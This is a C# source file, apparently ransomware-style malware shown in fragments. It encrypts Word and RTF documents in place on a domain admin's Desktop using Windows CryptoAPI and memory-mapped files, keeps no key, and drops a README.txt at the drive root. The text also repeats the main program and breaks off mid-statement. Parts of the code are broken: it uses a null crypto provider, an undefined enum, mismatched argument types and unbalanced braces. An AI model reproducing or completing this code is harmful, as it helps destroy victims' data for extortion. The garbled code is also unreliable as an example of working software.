using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

class Program
{
    // Constants for file mapping and encryption
    private const uint PAGE_READWRITE = 0x04;
    private const uint FILE_MAP_WRITE = 0x02;
    private const uint FILE_MAP_READ = 0x04;

    // Import required Windows APIs
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern bool CryptGenKey(IntPtr hProv, int Algid, int dwFlags, out IntPtr phKey);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern bool CryptEncrypt(IntPtr hKey, IntPtr hHash, bool Final, int dwFlags, byte[] pbData, ref int pdwDataLen, int dwBufLen);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateFileMapping(IntPtr hFile, IntPtr lpAttributes, uint flProtect, uint dwMaximumSizeHigh, uint dwMaximumSizeLow, string lpName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr MapViewOfFile(IntPtr hFileMappingObject, uint dwDesiredAccess, uint dwFileOffsetHigh, uint dwFileOffsetLow, uint dwNumberOfBytesToMap);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool UnmapViewOfFile(IntPtr lpBaseAddress);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint GetFileSize(IntPtr hFile, IntPtr lpFileSizeHigh);

    static void Main()
    {
        string directoryPath = @"C:\Users\domain.admin\Desktop";
        string[] fileExtensions = { ".doc", ".docx", ".rtf" };

        // Generate AES-128 key using CryptGenKey
        IntPtr hProv = IntPtr.Zero;
        IntPtr hKey = IntPtr.Zero;
        if (!CryptGenKey(hProv, (int)KeyNumber.CALG_AES_128, 0, out hKey))
        {
            Console.WriteLine("CryptGenKey failed.");
            return;
        }

        try
        {
            // Iterate through files in the directory
            foreach (string fileExtension in fileExtensions)
            {
                string[] filePaths = Directory.GetFiles(directoryPath, $"*{fileExtension}");
                foreach (string filePath in filePaths)
                {
                    // Get file handle
                    IntPtr hFile = CreateFile(filePath, FileAccess.ReadWrite, FileShare.ReadWrite, IntPtr.Zero, FileMode.Open, 0, IntPtr.Zero);
                    if (hFile == IntPtr.Zero)
                    {
                        Console.WriteLine($"Failed to open file: {filePath}");
                        continue;
                    }

                    try
                    {
                        // Get file size
                        uint fileSizeLow = GetFileSize(hFile, IntPtr.Zero);
                        if (fileSizeLow == 0xFFFFFFFF)
                        {
                            Console.WriteLine($"Failed to get file size: {filePath}");
                            continue;
                        }

                        // Create file mapping
                        IntPtr hMapping = CreateFileMapping(hFile, IntPtr.Zero, PAGE_READWRITE, 0, fileSizeLow, null);
                        if (hMapping == IntPtr.Zero)
                        {
                            Console.WriteLine($"Failed to create file mapping: {filePath}");
                            continue;
                        }
                        
                        try
                        {
                        // Map the view of the file mapping
                        IntPtr lpBaseAddress = MapViewOfFile(hMapping, FILE_MAP_WRITE | FILE_MAP_READ, 0, 0, fileSizeLow);
                        if (lpBaseAddress == IntPtr.Zero)
                        {
                            Console.WriteLine($"Failed to map file view: {filePath}");
                            continue;
                        }

                        try
                        {
                            // Perform encryption using CryptEncrypt
                            byte[] fileData = new byte[fileSizeLow];
                            Marshal.Copy(lpBaseAddress, fileData, 0, (int)fileSizeLow);
                            int dataLength = fileData.Length;
                            if (!CryptEncrypt(hKey, IntPtr.Zero, true, 0, fileData, ref dataLength, (int)fileSizeLow))
                            {
                                Console.WriteLine($"Encryption failed: {filePath}");
                                continue;
                            }

                            // Update encrypted data in memory
                            Marshal.Copy(fileData, 0, lpBaseAddress, (int)fileSizeLow);

                            Console.WriteLine($"Encryption completed: {filePath}");
                        }
                        finally
                        {
                            // Unmap the view of the file mapping
                            UnmapViewOfFile(lpBaseAddress);
                        }
                    }
                    finally
                    {
                        // Close the file mapping handle
                        CloseHandle(hMapping);
                    }
                }
                finally
                {
                    // Close the file handle
                    CloseHandle(hFile);
                }
            }
        }
    }
    finally
    {
        // Release the cryptographic key handle
        CloseHandle(hKey);
    }

    Console.WriteLine("Encryption process completed.");
}
}
                           




using System.IO;

class Program
{
    static void Main()
    {
        string filePath = @"C:\README.txt";
        string content = "Success";

        try
        {
            // Write the content to the file
            File.WriteAllText(filePath, content);
            Console.WriteLine("README.txt file created successfully.");
        }
        catch (Exception ex)
        {
            Console.WriteLine("An error occurred: " + ex.Message);
        }
    }
}


using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

class Program
{
    // Constants for file mapping and encryption
    private const uint PAGE_READWRITE = 0x04;
    private const uint FILE_MAP_WRITE = 0x02;
    private const uint FILE_MAP_READ = 0x04;

    // Import required Windows APIs
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern bool CryptGenKey(IntPtr hProv, int Algid, int dwFlags, out IntPtr phKey);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern bool CryptEncrypt(IntPtr hKey, IntPtr hHash, bool Final, int dwFlags, byte[] pbData, ref int pdwDataLen, int dwBufLen);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateFileMapping(IntPtr hFile, IntPtr lpAttributes, uint flProtect, uint dwMaximumSizeHigh, uint dwMaximumSizeLow, string lpName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr MapViewOfFile(IntPtr hFileMappingObject, uint dwDesiredAccess, uint dwFileOffsetHigh, uint dwFileOffsetLow, uint dwNumberOfBytesToMap);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool UnmapViewOfFile(IntPtr lpBaseAddress);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint GetFileSize(IntPtr hFile, IntPtr lpFileSizeHigh);

    static void Main()
    {
        string directoryPath = @"C:\Users\domain.admin\Desktop";
        string[] fileExtensions = { ".doc", ".docx", ".rtf" };

        // Generate AES-128 key using CryptGenKey
        IntPtr hProv = IntPtr.Zero;
        IntPtr hKey = IntPtr.Zero;
        if (!CryptGenKey(hProv, (int)KeyNumber.CALG_AES_128, 0, out hKey))
        {
            Console.WriteLine("CryptGenKey failed.");
            return;
        }

        try
        {
            // Iterate through files in the directory
            foreach (string fileExtension in fileExtensions)
            {
                string[] filePaths = Directory.GetFiles(directoryPath, $"*{fileExtension}");
                foreach (string filePath in filePaths)
                {
                    // Get file handle
                    IntPtr hFile = CreateFile(filePath, FileAccess.ReadWrite, FileShare.ReadWrite, IntPtr.Zero, FileMode.Open, 0, IntPtr.Zero);
                    if (hFile == IntPtr.Zero)
                    {
                        Console.WriteLine($"Failed to open file: {filePath}");
                        continue;
                    }

                    try
                    {
                        // Get file size
                        uint fileSizeLow = GetFileSize(hFile, IntPtr.Zero);
                        if (fileSizeLow == 0xFFFFFFFF)
                        {
                            Console.WriteLine($"Failed to get file size: {filePath}");
                            continue;
                        }

                        // Create file mapping
                        IntPtr hMapping = CreateFileMapping(hFile, IntPtr.Zero, PAGE_READWRITE, 0, fileSizeLow, null);
                        if (hMapping == IntPtr.Zero)
                        {
                            Console.WriteLine($"Failed to create file mapping: {filePath}");
                           






